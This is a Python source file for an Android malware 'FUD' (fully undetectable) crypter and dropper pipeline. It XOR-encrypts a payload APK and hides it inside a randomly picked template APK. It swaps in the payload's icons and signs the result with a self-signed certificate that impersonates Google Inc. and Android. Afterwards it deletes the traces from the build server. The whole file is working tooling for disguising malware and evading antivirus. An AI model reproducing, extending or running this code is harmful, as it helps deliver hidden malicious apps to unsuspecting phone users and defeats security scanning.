"""FUD pipeline — variant pick + payload inject + max signing + cleanup."""
import os
import glob
import random
import shutil
import subprocess
import time
import zipfile

from config import (
    PAYLOAD_XOR_KEY, VARIANTS_DIR, TEMPLATE_APK, KEYSTORE_DIR,
    KEYSTORE_PASS, KEY_ALIAS, APKSIGNER_BIN, ZIPALIGN_BIN,
    JAVA_BIN,
)
from setup import ensure_tools


def _step(session_dir, msg):
    try:
        with open(os.path.join(session_dir, "step.txt"), "w") as f:
            f.write(msg)
    except Exception:
        pass
    print(f"\n===== {msg} =====", flush=True)


def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    out = bytearray(len(data))
    klen = len(key)
    for i, b in enumerate(data):
        idx = (i * 7 + 3) % klen
        out[i] = (b ^ key[idx]) & 0xFF
    return bytes(out)


def _pick_template() -> str:
    variants = []
    if os.path.isdir(VARIANTS_DIR):
        variants = sorted(glob.glob(os.path.join(VARIANTS_DIR, "*.apk")))
    if variants:
        pick = random.choice(variants)
        print(f"[i] variant: {os.path.basename(pick)}", flush=True)
        return pick
    if os.path.exists(TEMPLATE_APK):
        print("[i] fallback template.apk", flush=True)
        return TEMPLATE_APK
    raise RuntimeError("no template")


def _extract_icons(payload_apk: str) -> dict:
    icons = {}
    try:
        with zipfile.ZipFile(payload_apk, "r") as z:
            for n in z.namelist():
                ln = n.lower()
                if not n.startswith("res/"):
                    continue
                if "ic_launcher" not in ln and "/mipmap" not in ln:
                    continue
                if not ln.endswith((".png", ".webp", ".jpg", ".jpeg")):
                    continue
                try:
                    icons[n] = z.read(n)
                except Exception:
                    pass
    except Exception:
        pass
    return icons


def _java_env() -> dict:
    env = os.environ.copy()
    jhome = os.path.dirname(os.path.dirname(JAVA_BIN))
    env["JAVA_HOME"] = jhome
    env["PATH"] = os.path.dirname(JAVA_BIN) + os.pathsep + env.get("PATH", "")
    return env


def _generate_keystore() -> str:
    os.makedirs(KEYSTORE_DIR, exist_ok=True)
    ks = os.path.join(KEYSTORE_DIR,
                      f"k_{int(time.time())}_{random.randint(1000,9999)}.p12")

    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import pkcs12
    import datetime

    key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME,             "US"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME,   "California"),
        x509.NameAttribute(NameOID.LOCALITY_NAME,            "Mountain View"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME,        "Google Inc."),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "Android"),
        x509.NameAttribute(NameOID.COMMON_NAME,              "Android"),
    ])
    now = datetime.datetime.utcnow()
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject).issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=10950))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .sign(key, hashes.SHA384())
    )
    p12 = pkcs12.serialize_key_and_certificates(
        name=KEY_ALIAS.encode(), key=key, cert=cert, cas=None,
        encryption_algorithm=serialization.BestAvailableEncryption(KEYSTORE_PASS.encode()),
    )
    with open(ks, "wb") as f:
        f.write(p12)
    return ks


def _sign(unsigned_apk: str, output_apk: str):
    ks = _generate_keystore()
    aligned = unsigned_apk + ".aligned"
    env = _java_env()

    subprocess.run(
        [ZIPALIGN_BIN, "-f", "-p", "4", unsigned_apk, aligned],
        check=True, capture_output=True, timeout=120, env=env,
    )

    cmd = [
        APKSIGNER_BIN, "sign",
        "--ks", ks,
        "--ks-pass", f"pass:{KEYSTORE_PASS}",
        "--ks-key-alias", KEY_ALIAS,
        "--key-pass", f"pass:{KEYSTORE_PASS}",
        "--v1-signing-enabled", "true",
        "--v2-signing-enabled", "true",
        "--v3-signing-enabled", "true",
        "--v4-signing-enabled", "true",
        "--out", output_apk,
        aligned,
    ]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=300, env=env)
    if p.returncode != 0:
        raise RuntimeError(f"apksigner: {p.stdout} {p.stderr}")

    if os.path.exists(aligned):
        os.remove(aligned)


def full_fud_pipeline_dropper(template_apk: str, payload_apk: str,
                              output_apk: str, session_dir: str) -> str:
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    if not template_apk or not os.path.exists(template_apk):
        template_apk = _pick_template()

    _step(session_dir, "1/3 encrypt payload + extract icons")
    with open(payload_apk, "rb") as f:
        payload_bytes = f.read()
    encrypted = _xor_encrypt(payload_bytes, PAYLOAD_XOR_KEY)
    icons = _extract_icons(payload_apk)
    print(f"[i] payload {len(payload_bytes)}b, {len(icons)} icons", flush=True)

    _step(session_dir, "2/3 rebuild apk")
    unsigned = os.path.join(session_dir, "unsigned.apk")

    with zipfile.ZipFile(template_apk, "r") as zin, \
         zipfile.ZipFile(unsigned, "w", zipfile.ZIP_DEFLATED) as zout:

        template_names = set(zin.namelist())

        for item in zin.infolist():
            fn = item.filename
            if fn.startswith("META-INF/") or fn == "assets/output.apk":
                continue
            if fn in icons:
                zout.writestr(item, icons[fn])
                continue
            try:
                data = zin.read(fn)
            except Exception:
                continue
            if fn.endswith(".dex") or fn == "resources.arsc" or fn == "AndroidManifest.xml":
                zout.writestr(item, data, compress_type=zipfile.ZIP_STORED)
            else:
                zout.writestr(item, data)

        for fn, data in icons.items():
            if fn not in template_names:
                zout.writestr(fn, data)

        info = zipfile.ZipInfo("assets/output.apk")
        info.compress_type = zipfile.ZIP_STORED
        zout.writestr(info, encrypted)

    _step(session_dir, "3/3 sign")
    _sign(unsigned, output_apk)

    # CLEANUP — server pe kuch na bache
    try:
        if os.path.exists(unsigned):
            os.remove(unsigned)
        if os.path.exists(payload_apk):
            os.remove(payload_apk)
    except Exception:
        pass

    _step(session_dir, "done")
    print(f"[✓] DONE → {output_apk}", flush=True)
    return output_apk


def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)
    tmp = output_apk + ".unsigned"
    shutil.copy2(input_apk, tmp)
    _sign(tmp, output_apk)
    if os.path.exists(tmp):
        os.remove(tmp)
    if os.path.exists(input_apk):
        os.remove(input_apk)
    return output_apk
